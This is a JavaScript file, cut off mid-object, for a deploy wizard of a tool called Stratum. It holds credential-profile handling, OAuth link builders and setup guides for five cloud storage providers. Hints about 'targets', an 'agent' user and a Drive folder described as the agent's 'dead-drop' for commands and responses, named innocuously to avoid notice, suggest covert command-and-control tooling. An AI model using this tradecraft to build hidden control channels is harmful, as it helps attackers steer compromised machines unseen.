/* ─────────────────────────────────────────────────────────────────────────────
   deploy.js — 4-step Deploy Wizard (Provider → Credentials → Config → Build)

   Credential profiles are managed server-side via the /api/v1/deploy endpoint.
   The wizard collects credentials in-memory and posts them as part of the deploy config.
───────────────────────────────────────────────────────────────────────────── */

const Deploy = (() => {
  const STEPS = ['Provider', 'Credentials', 'Configuration', 'Build'];

  let _step             = 0;
  let _provId           = null;   // selected provider id
  let _creds            = {};     // collected credential + channel values
  let _cmVals           = {};     // collected common-field values
  let _providers        = {};     // { id → {id, label, fields} }
  let _cmFields         = [];     // common_fields array from server
  let _taskId           = null;
  let _sse              = null;
  let _progIdx          = 0;

  /* Step-1 sub-state:
     'pick'    → profile picker list
     'channel' → channel-only form (after picking a saved profile)
     'new'     → full credential form (new credentials)  */
  let _credMode         = null;
  let _selectedProfId   = null;   // id of profile chosen in picker

  /* Abort any in-flight OAuth exchange on step change or wizard close */
  function _stopOAuth() { /* reserved for future cleanup */ }

  /* ── Server-backed credential profile store ─────────────────────────────────
     Profiles live in  credentials/{provider}.json  on the server disk —
     the same files the deploy wizard reads/writes.
     An in-memory cache (_profileCache) avoids redundant requests.
  ─────────────────────────────────────────────────────────────────────────── */
  let _profileCache = {};   // { pid → [profile, …] }
  let _profileFetch = {};   // { pid → Promise } — de-duplicates in-flight requests

  function _profilesFor(pid) { return _profileCache[pid] || []; }

  function _hasSavedProfiles(pid) {
    return _profilesFor(pid).some(p => p.identifier || p.id);
  }

  /* Fetch profiles from server and update cache.
     Returns (and memoises) the same Promise if a request is already in flight. */
  function _fetchProfiles(pid) {
    if (!_profileFetch[pid]) {
      _profileFetch[pid] = (async () => {
        try {
          const r = await API.credList(pid);
          _profileCache[pid] = (r && r.profiles) ? r.profiles : [];
        } catch (e) {
          console.warn('credential fetch failed for', pid, e);
          if (!_profileCache[pid]) _profileCache[pid] = [];
        }
        delete _profileFetch[pid];   // allow fresh fetch next call
        return _profileCache[pid];
      })();
    }
    return _profileFetch[pid];
  }

  /* Remove a profile from the server and cache. */
  async function _deleteProfileRemote(pid, id) {
    try {
      await API.credDelete(pid, id);
      _profileCache[pid] = (_profileCache[pid] || []).filter(p => p.id !== id);
    } catch (e) {
      console.warn('credential delete failed:', e);
    }
  }

  /* Helpers used by external callers (Settings modal) */
  function _hasCreds(pid)   { return _hasSavedProfiles(pid); }
  function _loadCreds(pid)  { return _profilesFor(pid)[0]?.creds || null; }
  function _clearCreds(pid) { /* intentionally a no-op — use removeProfile per entry */ }

  /* ── Helpers ─────────────────────────────────────────────────────────────── */
  const $$ = (sel, ctx = document) => Array.from(ctx.querySelectorAll(sel));

  /* ── DOM refs ────────────────────────────────────────────────────────────── */
  const _modal   = () => document.getElementById('deploy-modal');
  const _body    = () => document.getElementById('deploy-body');
  const _btnPrev = () => document.getElementById('deploy-prev');
  const _btnNext = () => document.getElementById('deploy-next');

  /* ── step indicators ─────────────────────────────────────────────────────── */
  function _updateStepIndicators() {
    const m = _modal();
    if (!m) return;
    $$('.ds-circle', m).forEach((c, i) => {
      c.classList.remove('done', 'active');
      if      (i < _step)  c.classList.add('done');
      else if (i === _step) c.classList.add('active');
    });
    $$('.ds-line', m).forEach((l, i) => l.classList.toggle('done', i < _step));
    const t = $('.step-title', m);
    if (t) t.textContent = `Step ${_step + 1}: ${STEPS[_step]}`;
  }

  function _setPrev(on, label = 'Back')    { const b = _btnPrev(); if (!b) return; b.disabled = !on; b.textContent = label; }
  function _setNext(on, label = 'Next →')  { const b = _btnNext(); if (!b) return; b.disabled = !on; b.textContent = label; }

  /* ═══════════════════════════════════════════════════════════════════════════
     STEP 0 — Provider
  ═══════════════════════════════════════════════════════════════════════════ */
  function _renderStep0() {
    const body  = _body();
    const names = Object.keys(_providers);

    if (!names.length) {
      body.innerHTML = '<p class="text-dim" style="margin:.5rem 0">Loading providers…</p>';
      _setPrev(false); _setNext(false);
      API.providers().then(data => {
        _providers = Object.fromEntries((data.providers || []).map(p => [p.id, p]));
        _cmFields  = data.common_fields || [];
        _renderStep0();
      }).catch(() => {
        body.innerHTML = '<p class="text-red">Failed to load providers from server.</p>';
      });
      return;
    }

    body.innerHTML = `<div class="form-group">
      <label>Cloud Provider</label>
      <div class="radio-group" id="prov-rg"></div>
    </div>`;
    const grp = document.getElementById('prov-rg');

    const _PROVIDER_HINTS = {
      dropbox:     'Suggested for personal devices and BYOD environments',
      onedrive:    'Suggested for Microsoft 365 / domain-joined workstations',
      s3:          'Suggested for cloud-hosted targets with outbound AWS access',
      sharepoint:  'Suggested for corporate environments with SharePoint Online',
      googledrive: 'Suggested for Google Workspace and education networks',
    };

    names.forEach(pid => {
      const p     = _providers[pid];
      const count = _profilesFor(pid).length;   // from cache (0 on first render, updated async)
      const hint  = _PROVIDER_HINTS[pid] || '';
      const card  = document.createElement('div');
      card.className = `radio-card${_provId === pid ? ' selected' : ''}`;
      card.innerHTML = `
        <input type="radio" name="provider" value="${escHtml(pid)}" ${_provId === pid ? 'checked' : ''}>
        <div style="flex:1;min-width:0">
          <div class="rc-title" style="display:flex;align-items:center;gap:7px">
            <span class="prov-icon-here"></span>
            ${escHtml(p.label || pid)}
            ${count ? `<span class="cred-badge">🔑 ${count} saved</span>` : ''}
          </div>
          <div class="rc-desc">${escHtml(hint)}</div>
        </div>`;
      card.querySelector('.prov-icon-here').appendChild(providerIcon(pid, 'provider-icon'));
      card.addEventListener('click', () => {
        $$('.radio-card', grp).forEach(c => c.classList.remove('selected'));
        card.classList.add('selected');
        card.querySelector('input[type=radio]').checked = true;
        _provId = pid;
        _setNext(true);
        /* Pre-fetch credentials in background so Next is instant */
        _fetchProfiles(pid);
      });
      grp.appendChild(card);
    });

    _setPrev(false);
    _setNext(!!_provId);
  }

  /* ═══════════════════════════════════════════════════════════════════════════
     Provider setup guides — shown via ? button in Step 1
  ═══════════════════════════════════════════════════════════════════════════ */
  const _PROVIDER_GUIDES = {
    dropbox: {
      title: 'Dropbox — Setup Guide',
      html: `
        <div class="guide-section guide-existing">
          <div class="guide-section-hdr">✔ Already have a Dropbox app?</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://www.dropbox.com/developers/apps" target="_blank">dropbox.com/developers/apps</a> → click your app</li>
            <li><b>Settings</b> tab → copy <b>App key</b> and <b>App secret</b></li>
            <li>Refresh token: see section 3 below — you must run the OAuth flow each time
              (the App Console "Generate" button only produces short-lived access tokens, not refresh tokens)</li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">1 — Create a new Dropbox App</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://www.dropbox.com/developers/apps/create" target="_blank">dropbox.com/developers/apps/create</a></li>
            <li>Choose <b>Scoped access</b> → <b>Full Dropbox</b> → name it anything</li>
            <li><b>Permissions</b> tab → enable <code class="guide-code">files.content.read</code> and <code class="guide-code">files.content.write</code></li>
            <li><b>Settings</b> tab → copy <b>App key</b> and <b>App secret</b></li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">2 — Get Refresh Token (OAuth2 offline flow)</div>
          <ol class="guide-steps">
            <li>Open this URL in a browser (replace <code class="guide-code">YOUR_APP_KEY</code>):<br>
                <code class="guide-code guide-url">https://www.dropbox.com/oauth2/authorize?response_type=code&amp;client_id=YOUR_APP_KEY&amp;token_access_type=offline</code></li>
            <li>Authorize the app → copy the <b>authorization code</b> shown on screen</li>
            <li>POST to <code class="guide-code">https://api.dropboxapi.com/oauth2/token</code>:<br>
                <code class="guide-code">grant_type=authorization_code &amp; code=&lt;code&gt; &amp; client_id=&lt;key&gt; &amp; client_secret=&lt;secret&gt;</code></li>
            <li>Copy <code class="guide-code">refresh_token</code> from the JSON response</li>
          </ol>
          <p class="guide-note">💡 The deploy wizard handles the OAuth2 token exchange automatically when using the WebGUI.</p>
        </div>`,
    },

    onedrive: {
      title: 'OneDrive — Setup Guide',
      html: `
        <div class="guide-section" style="background:rgba(255,50,50,.06);border-color:rgba(255,80,80,.25)">
          <div class="guide-section-hdr" style="color:var(--accent-bright,#e05555)">⚠ Personal OneDrive vs Work OneDrive — read this first</div>
          <p style="font-size:.78rem;margin:.3rem 0 0">
            Stratum targets <b>personal OneDrive</b>, which requires a <b>Microsoft Account (MSA)</b> — typically <code class="guide-code">@outlook.com</code>, <code class="guide-code">@hotmail.com</code>, <code class="guide-code">@live.com</code>, or any email address (including Gmail) registered as a Microsoft Account at <a class="guide-link" href="https://account.microsoft.com" target="_blank">account.microsoft.com</a>.<br>
            The <b>Azure free account</b> you create to register the app is only a container for the app registration — it is <b>not</b> the account that owns the OneDrive.<br>
            When authorizing in Step 4, you must sign in with your <b>personal MSA account</b>, not with the Azure/Entra admin account.<br>
            Using a work/Entra account will cause a <code class="guide-code">Tenant does not have a SPO license</code> error at deploy time.
          </p>
        </div>

        <div class="guide-section guide-existing">
          <div class="guide-section-hdr">✔ Already have an Azure AD app registration?</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade" target="_blank">Azure Portal → App registrations</a> → click your app</li>
            <li><b>Overview</b>: copy <b>Application (client) ID</b> and <b>Directory (tenant) ID</b></li>
            <li><b>Client credentials → Add a certificate or secret → New client secret</b> — the <b>Value</b> is shown only at creation; if lost, create a new one and delete the old</li>
            <li>Verify API permissions: <code class="guide-code">Files.ReadWrite.All</code> must be present and consented</li>
            <li><b>Authentication</b>: verify supported account types is <b>"Any Entra ID Tenant + Personal Microsoft accounts"</b> and that <code class="guide-code">http://localhost</code> is listed under Web redirect URIs — if not, add it and save</li>
            <li>Re-generate the refresh token in Step 4 signing in with your <b>personal MSA account</b> (@outlook / @hotmail / @live)</li>
          </ol>
        </div>

        <div class="guide-section" style="background:rgba(255,180,0,.07);border-color:rgba(255,180,0,.25)">
          <div class="guide-section-hdr" style="color:var(--warn,#f5a623)">⚠ Microsoft changed the registration flow (June 2024)</div>
          <p style="font-size:.78rem;margin:.3rem 0 0">Personal Microsoft accounts can no longer create App Registrations without a directory/tenant.
          You need a free Azure account to get an Entra ID tenant for the app registration — this is separate from the OneDrive account.</p>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Option A — Free Azure Account <span style="font-size:.68rem;opacity:.6;font-weight:400">(recommended — 5 min)</span></div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://azure.microsoft.com/free" target="_blank">azure.microsoft.com/free</a> — you can sign up with any Microsoft account (it does not need to be the OneDrive account) — no credit card required for the free tier</li>
            <li>Azure creates a free <b>Entra ID tenant</b> — App Registrations are always free regardless of the Azure subscription status</li>
            <li>Once ready, go to <a class="guide-link" href="https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade" target="_blank">portal.azure.com → App registrations</a> and continue from <b>Step 1</b> below</li>
          </ol>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Option B — M365 Developer Program <span style="font-size:.68rem;opacity:.6;font-weight:400">(slower, less reliable in 2025)</span></div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://developer.microsoft.com/en-us/microsoft-365/dev-program" target="_blank">developer.microsoft.com/microsoft-365/dev-program</a> → Join Now</li>
            <li>Sign in with your personal Microsoft account → complete the profile form → Join</li>
            <li>If a developer tenant (E5) is offered, accept it — this gives you a full Entra ID directory</li>
            <li>⚠ Microsoft suspended automatic E5 tenant provisioning in late 2024 — if no tenant is offered, fall back to <b>Option A</b></li>
            <li>Once active, sign in at <a class="guide-link" href="https://portal.azure.com" target="_blank">portal.azure.com</a> with the <b>developer tenant account</b> and continue from <b>Step 1</b> below</li>
          </ol>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 1 — Register a new App</div>
          <ol class="guide-steps">
            <li>Azure Portal → <b>Microsoft Entra ID → Add → App registrations → New registration</b></li>
            <li>Name: anything (e.g. <code class="guide-code">stratum-drop</code>)</li>
            <li>Supported account types → <b>"Any Entra ID Tenant + Personal Microsoft accounts"</b> — this is mandatory to allow personal MSA accounts to authorize</li>
            <li>Redirect URI: select <b>Web</b> from the dropdown → enter <code class="guide-code">http://localhost</code> → <b>Register</b></li>
            <li><b>Overview</b>: copy <b>Application (client) ID</b> → your <b>Client ID</b></li>
            <li><b>Overview</b>: copy <b>Directory (tenant) ID</b> → your <b>Tenant ID</b></li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">Step 2 — Create Client Secret</div>
          <ol class="guide-steps">
            <li><b>Client credentials → Add a certificate or secret → New client secret</b> → any description and expiry → Add</li>
            <li>Copy the <b>Value</b> column immediately — this is your <b>Client Secret</b>; it disappears after you navigate away and cannot be recovered</li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">Step 3 — Add API Permissions</div>
          <ol class="guide-steps">
            <li><b>API permissions → Add a permission → Microsoft Graph → Delegated permissions</b></li>
            <li>Search and enable <code class="guide-code">Files.ReadWrite.All</code> and <code class="guide-code">offline_access</code> → Add permissions</li>
            <li>Click <b>Grant admin consent</b> (required even for personal tenants)</li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">Step 4 — Get Refresh Token</div>
          <ol class="guide-steps">
            <li>Fill in Client ID, Tenant ID and Client Secret in the form, then click <b>Generate Link</b></li>
            <li>Open the link — when the Microsoft login page appears, sign in with your <b>personal MSA account</b> (any Microsoft Account: @outlook.com, @hotmail.com, @live.com, or a Gmail/other address registered as MSA) that owns the OneDrive — <b>not</b> with the Azure/Entra admin account</li>
            <li>On the permissions consent page, click <b>Accept</b> — if the checkbox <b>"Consent on behalf of your organization"</b> appears, check it before accepting</li>
            <li>The browser redirects to <code class="guide-code">http://localhost</code> and shows a connection error — that is expected. Copy the <b>full URL</b> from the address bar and paste it into the code field — Stratum extracts the code automatically</li>
            <li>Click <b>Get Refresh Token →</b> — the token is filled in and saved automatically</li>
          </ol>
        </div>`,
    },

    s3: {
      title: 'AWS S3 — Setup Guide',
      html: `
        <div class="guide-section guide-existing">
          <div class="guide-section-hdr">✔ Already have IAM credentials?</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://console.aws.amazon.com/iam/" target="_blank">IAM Console</a> → <b>IAM Users</b> → select your user → <b>Security credentials</b> tab → <b>Access keys</b> section — your Access Key ID is listed there</li>
            <li>The <b>Secret Access Key</b> is shown only at creation and cannot be retrieved later. If lost, delete the old key and create a new one (max 2 per user)</li>
            <li>To create a new key: <b>Security credentials</b> tab → <b>Create access key</b> → <b>Application running outside AWS</b> → copy both values</li>
            <li>Find your bucket region: <a class="guide-link" href="https://s3.console.aws.amazon.com/s3/" target="_blank">S3 Console</a> → click bucket name → the region is shown in the <b>AWS Region</b> column (e.g. <code class="guide-code">eu-north-1</code>)</li>
          </ol>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 1 — Create S3 Bucket</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://s3.console.aws.amazon.com/s3/" target="_blank">S3 Console</a> → <b>Create bucket</b></li>
            <li>Bucket name: lowercase letters, numbers and hyphens only (e.g. <code class="guide-code">stratum-drop</code>) — note it, you will need it below</li>
            <li>AWS Region: choose the region closest to your target (e.g. <code class="guide-code">eu-north-1</code> Stockholm, <code class="guide-code">eu-west-1</code> Ireland, <code class="guide-code">us-east-1</code> Virginia) — note it exactly as shown</li>
            <li>Leave <b>Block all public access</b> enabled — all communication is authenticated via Sig V4</li>
            <li>Leave all other settings as default → <b>Create bucket</b></li>
          </ol>
          <p class="guide-note">⚠ The region you enter in the form below must match exactly the region where the bucket was created — a mismatch causes all uploads to fail.</p>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 2 — Create IAM Policy</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://console.aws.amazon.com/iam/" target="_blank">IAM Console</a> → <b>Policies</b> → <b>Create policy</b></li>
            <li>Switch to the <b>JSON</b> tab and paste the policy below, replacing <code class="guide-code">YOUR-BUCKET-NAME</code> with the bucket name from Step 1</li>
            <li>Click <b>Next</b> → name the policy (e.g. <code class="guide-code">stratum-s3-policy</code>) → <b>Create policy</b>
                <pre class="guide-code" style="margin-top:.4rem;white-space:pre-wrap">{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject","s3:PutObject","s3:DeleteObject","s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::YOUR-BUCKET-NAME",
      "arn:aws:s3:::YOUR-BUCKET-NAME/*"
    ]
  }]
}</pre></li>
          </ol>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 3 — Create IAM User</div>
          <ol class="guide-steps">
            <li>IAM Console → <b>IAM Users</b> → <b>Create user</b></li>
            <li>Username: anything (e.g. <code class="guide-code">stratum-agent</code>) → <b>Next</b></li>
            <li>Permissions: <b>Attach policies directly</b> → search <code class="guide-code">stratum-s3-policy</code> → select it → <b>Next</b> → <b>Create user</b></li>
            <li>Open the user → <b>Security credentials</b> tab → <b>Create access key</b> → <b>Application running outside AWS</b> → <b>Next</b> → <b>Create access key</b></li>
            <li>Copy <b>Access Key ID</b> and <b>Secret Access Key</b> — the secret is shown <em>only once</em></li>
          </ol>
        </div>`,
    },

    sharepoint: {
      title: 'SharePoint — Setup Guide',
      html: `
        <div class="guide-warn">
          ⚠ SharePoint requires a <b>Microsoft 365 work or school tenant</b> — personal MSA accounts (outlook.com, hotmail.com, live.com) are <b>not supported</b>.<br>
          Granting admin consent requires a <b>Global Admin</b> or <b>SharePoint Admin</b> role on the tenant.
        </div>

        <div class="guide-section guide-existing">
          <div class="guide-section-hdr">✔ Already have an Azure app registration?</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://portal.azure.com" target="_blank">portal.azure.com</a> → <b>Microsoft Entra ID</b> → <b>App registrations</b> → <b>All applications</b> → click your app</li>
            <li><b>Overview</b>: copy <b>Application (client) ID</b> → paste as <b>Client ID</b><br>
                copy <b>Directory (tenant) ID</b> → paste as <b>Tenant ID</b></li>
            <li><b>Client credentials</b>: the secret Value is shown only at creation. If lost, create a new one and delete the old.</li>
            <li>Verify <b>API permissions</b> includes <code class="guide-code">Sites.ReadWrite.All</code> (Delegated) with <b>Admin consent granted</b></li>
            <li>Verify <b>Authentication</b> has a <b>Web</b> platform with redirect URI: <code class="guide-code">{{CALLBACK_URL}}</code></li>
            <li>For the <b>Site ID</b> see Step 3 below — always retrievable via the Graph API</li>
          </ol>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 1 — Register an Azure App</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://portal.azure.com" target="_blank">portal.azure.com</a> → <b>Microsoft Entra ID</b> → <b>Add</b> → <b>App registrations</b> → <b>New registration</b></li>
            <li>Name: anything (e.g. <code class="guide-code">stratum-sp</code>)</li>
            <li>Supported account types: <b>Accounts in this organizational directory only</b> (single tenant)</li>
            <li>Redirect URI: platform <b>Web</b>, value <code class="guide-code">{{CALLBACK_URL}}</code> → <b>Register</b></li>
            <li><b>Overview</b>: copy <b>Application (client) ID</b> → paste as <b>Client ID</b><br>
                copy <b>Directory (tenant) ID</b> → paste as <b>Tenant ID</b></li>
            <li><b>Client credentials</b> → <b>Add a certificate or secret</b> → <b>New client secret</b> → set expiry → <b>Add</b><br>
                Copy the <b>Value</b> immediately (shown only once) → paste as <b>Client Secret</b></li>
          </ol>
          <p class="guide-note">💡 To modify the redirect URI later: <b>Authentication</b> → under <b>Web</b> platform → edit the URI → <b>Save</b>.</p>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 2 — Add SharePoint Permissions</div>
          <ol class="guide-steps">
            <li><b>API permissions</b> → <b>Add a permission</b> → <b>Microsoft Graph</b> → <b>Delegated permissions</b></li>
            <li>Search and add: <code class="guide-code">Sites.ReadWrite.All</code>, <code class="guide-code">Files.ReadWrite.All</code>, <code class="guide-code">offline_access</code></li>
            <li>Click <b>Grant admin consent for [your tenant]</b> — requires Global Admin or SharePoint Admin role<br>
                All permissions should show a green ✔ under <b>Status</b></li>
          </ol>
          <p class="guide-note">⚠ Without admin consent the OAuth flow will succeed but the token will be rejected when accessing SharePoint files.</p>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 3 — Get the Site ID</div>
          <ol class="guide-steps">
            <li>Find your SharePoint site URL — it looks like:<br>
                <code class="guide-code">https://yourtenant.sharepoint.com/sites/yoursite</code></li>
            <li>Call the Graph API in a browser (you must be logged in with a work account):<br>
                <code class="guide-code guide-url">https://graph.microsoft.com/v1.0/sites/yourtenant.sharepoint.com:/sites/yoursite</code></li>
            <li>Copy the <code class="guide-code">id</code> field from the JSON response — it has the format:<br>
                <code class="guide-code">yourtenant.sharepoint.com,xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx,yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy</code></li>
            <li>Paste the full string as <b>Site ID</b></li>
          </ol>
          <p class="guide-note">💡 Alternatively use <a class="guide-link" href="https://developer.microsoft.com/en-us/graph/graph-explorer" target="_blank">Graph Explorer</a> — sign in with your work account and run the query above.</p>
        </div>

        <div class="guide-section">
          <div class="guide-section-hdr">Step 4 — Get Refresh Token</div>
          <ol class="guide-steps">
            <li>Fill in <b>Client ID</b> and <b>Tenant ID</b> above, then click <b>Generate authorization link</b> — Stratum builds the OAuth URL automatically</li>
            <li>Open the link — sign in with your <b>work or school account</b> on this tenant</li>
            <li>When prompted, check <b>"Consent on behalf of your organization"</b> if the checkbox appears — then click <b>Accept</b></li>
            <li>The browser will redirect to <code class="guide-code">http://localhost</code> and show an error — that is expected</li>
            <li>Copy the <b>full URL</b> from the address bar and paste it into the <b>Authorization Code</b> field below — Stratum extracts the code automatically</li>
            <li>Click <b>Get Refresh Token</b></li>
          </ol>
          <p class="guide-note">⚠ If you see <b>AADSTS65001</b> (consent required) — admin consent in Step 2 was not completed. Return to API permissions and grant it.</p>
          <p class="guide-note">⚠ If you see <b>AADSTS50011</b> (redirect URI mismatch) — verify the redirect URI in <b>Authentication</b> matches exactly: <code class="guide-code">{{CALLBACK_URL}}</code></p>
        </div>`,
    },

    googledrive: {
      title: 'Google Drive — Setup Guide',
      html: `
        <div class="guide-section guide-existing">
          <div class="guide-section-hdr">✔ Already have Google OAuth credentials?</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://console.cloud.google.com/apis/credentials" target="_blank">Google Cloud Console → APIs &amp; Services → Credentials</a></li>
            <li>Find your <b>OAuth 2.0 Client ID</b> → click the edit (✏️) icon</li>
            <li>Copy <b>Client ID</b> and <b>Client Secret</b> from the detail panel</li>
            <li>For the <b>Refresh Token</b>: go to <a class="guide-link" href="https://developers.google.com/oauthplayground/" target="_blank">OAuth Playground</a> → ⚙ Settings → enable <b>Use your own OAuth credentials</b> → enter Client ID &amp; Secret → authorize scope <code class="guide-code">https://www.googleapis.com/auth/drive</code> → Exchange auth code → copy <b>Refresh token</b></li>
            <li>⚠️ Use <em>your own credentials</em> in the Playground settings — otherwise the token expires in 24 h</li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">1 — Create a Google Cloud Project</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://console.cloud.google.com/" target="_blank">console.cloud.google.com</a> → New project</li>
            <li>APIs &amp; Services → Enable APIs → search <b>Google Drive API</b> → Enable</li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">2 — Configure OAuth Consent Screen</div>
          <p class="guide-note">⚠️ Required before creating credentials — Google blocks credential creation on new projects until this is done.</p>
          <ol class="guide-steps">
            <li>APIs &amp; Services → <a class="guide-link" href="https://console.cloud.google.com/auth/overview" target="_blank">OAuth consent screen</a> (or: <b>Auth Platform</b> in the left menu → <b>Get started</b>)</li>
            <li><b>App name</b>: any name (e.g. <code class="guide-code">stratum</code>) — not shown to end users in internal/testing mode</li>
            <li><b>User support email</b>: your Google account email</li>
            <li><b>Audience</b>: choose <b>External</b> (works with any Google account) — click <b>Create</b></li>
            <li>Scopes page → <b>Add or remove scopes</b> → search <code class="guide-code">drive</code> → select <code class="guide-code">https://www.googleapis.com/auth/drive</code> → Update → Save and continue</li>
            <li>Audience page → select <b>External</b> → <b>Next</b> → under <b>Test users</b> → <b>Add users</b> → add the Google account email you will authorize with → <b>Save</b></li>
            <li>Review summary → <b>Back to dashboard</b></li>
          </ol>
          <p class="guide-note">💡 Leave the app in <b>Testing</b> status — publishing is not needed. Tokens issued in Testing are valid indefinitely for listed test users.</p>
          <p class="guide-note">⚠️ If you see <b>Error 403: access_denied</b> when authorizing — your Google account is not in the test users list. Fix: <a class="guide-link" href="https://console.cloud.google.com/auth/audience" target="_blank">Google Auth Platform → Audience</a> → scroll to <b>Test users</b> section → <b>Add users</b> → enter the email you are signing in with → <b>Save</b>.</p>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">3 — Create OAuth 2.0 Credentials</div>
          <ol class="guide-steps">
            <li>APIs &amp; Services → Credentials → Create credentials → <b>OAuth 2.0 Client ID</b></li>
            <li>Application type: <b>Desktop app</b> (required for offline refresh tokens)</li>
            <li>Copy <b>Client ID</b> and <b>Client Secret</b></li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">4 — Get Refresh Token</div>
          <ol class="guide-steps">
            <li>Go to <a class="guide-link" href="https://developers.google.com/oauthplayground/" target="_blank">developers.google.com/oauthplayground</a></li>
            <li>Click ⚙ (top right) → enable <b>Use your own OAuth credentials</b> → enter Client ID &amp; Secret</li>
            <li>In Step 1, select <code class="guide-code">Drive API v3 → https://www.googleapis.com/auth/drive</code> → Authorize APIs</li>
            <li>In Step 2, click <b>Exchange authorization code for tokens</b> → copy <b>Refresh token</b></li>
          </ol>
        </div>
        <div class="guide-section">
          <div class="guide-section-hdr">5 — Create the Dead-Drop Folder and Get its ID</div>
          <ol class="guide-steps">
            <li>Open <a class="guide-link" href="https://drive.google.com/drive/my-drive" target="_blank">drive.google.com/drive/my-drive</a></li>
            <li>Click <b>+ New</b> (top-left) → <b>New folder</b> → name it anything innocuous (e.g. <code class="guide-code">assets</code>, <code class="guide-code">backup</code>, <code class="guide-code">sync</code>) → <b>Create</b></li>
            <li>Double-click the folder to open it — the browser URL will change to:<br>
                <code class="guide-code">https://drive.google.com/drive/folders/<b>1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs</b></code></li>
            <li>Copy the alphanumeric string at the end of the URL (after <code class="guide-code">/folders/</code>) — paste it into the <b>Folder ID</b> field in the wizard.<br>
                Example: <code class="guide-code">1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs</code> — it looks like a random string of letters and digits, never contains <code class="guide-code">/</code> or starts with <code class="guide-code">4/</code></li>
          </ol>
          <p class="guide-note">💡 This folder is the agent's dead-drop: commands are uploaded here and responses are written back here. Keep it private — do not share it.</p>
          <p class="guide-note">⚠️ Do not paste the <b>Authorization Code</b> here — that starts with <code class="guide-code">4/1...</code> and is a different value used in the OAuth step above.</p>
        </div>`,
    },
  };

  function _openGuide() {
    const guide = _PROVIDER_GUIDES[_provId];
    if (!guide) return;
    const titleEl = document.getElementById('guide-title');
    const bodyEl  = document.getElementById('guide-body');
    if (titleEl) titleEl.textContent = guide.title;
    if (bodyEl) {
      const callbackUrl = `${location.origin}/api/v1/deploy/oauth/callback`;
      bodyEl.innerHTML = guide.html.replace(/\{\{CALLBACK_URL\}\}/g, callbackUrl);
    }
    Modal.open('guide-modal');
  }

  /* ═══════════════════════════════════════════════════════════════════════════
     OAuth helper — OOB flow (no redirect_uri registration required)
  ═══════════════════════════════════════════════════════════════════════════ */
  const _OAUTH_URL = {
    dropbox: (f) => {
      if (!f.app_key) return null;
      return 'https://www.dropbox.com/oauth2/authorize'
           + '?response_type=code'
           + '&client_id='         + encodeURIComponent(f.app_key)
           + '&token_access_type=offline';
    },
    onedrive: (f) => {
      if (!f.app_key) return null;
      /* Use 'consumers' to force personal MSA login — tenant ID would issue a
         work/Entra token that lacks the SPO license needed for /me/drive */
      return 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize'
           + '?client_id='     + encodeURIComponent(f.app_key)
           + '&response_type=code'
           + '&redirect_uri=http%3A%2F%2Flocalhost'
           + '&scope='         + encodeURIComponent('Files.ReadWrite.All offline_access')
           + '&response_mode=query';
    },
    sharepoint: (f) => {
      if (!f.app_key) return null;
      const tenant = f.tenant_id || 'common';
      return 'https://login.microsoftonline.com/' + encodeURIComponent(tenant)
           + '/oauth2/v2.0/authorize'
           + '?client_id='     + encodeURIComponent(f.app_key)
           + '&response_type=code'
           + '&redirect_uri=http%3A%2F%2Flocalhost'
           + '&scope='         + encodeURIComponent('Sites.ReadWrite.All Files.ReadWrite.All offline_access')
           + '&response_mode=query';
    },
    googledrive: (f) => {
      if (!f.app_key) return null;
      return 'https://accounts.google.com/o/oauth2/v2/auth'
           + '?client_id='     + encodeURIComponent(f.app_key)
           + '&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob'
           + '&response_type=code'
           + '&scope='         + encodeURIComponent('https://www.googleapis.com/auth/drive')
           + '&access_type=offline&prompt=consent';
    },
  };

  const _OAUTH_CODE_HINT = {
    dropbox:     'Dropbox shows the authorization code directly on the page after you click "Allow". Copy it and paste it below.',
    onedrive:    'After you authorize, the browser will try to open <b>http://localhost</b> and fail — that\'s expected. Copy the <b>full URL</b> from the address bar and paste it below — Stratum extracts the code automatically.',
    sharepoint:  'After you authorize, the browser will try to open <b>http://localhost</b> and fail — that\'s expected. Copy the <b>full URL</b> from the address bar and paste it below — Stratum extracts the code automatically.',
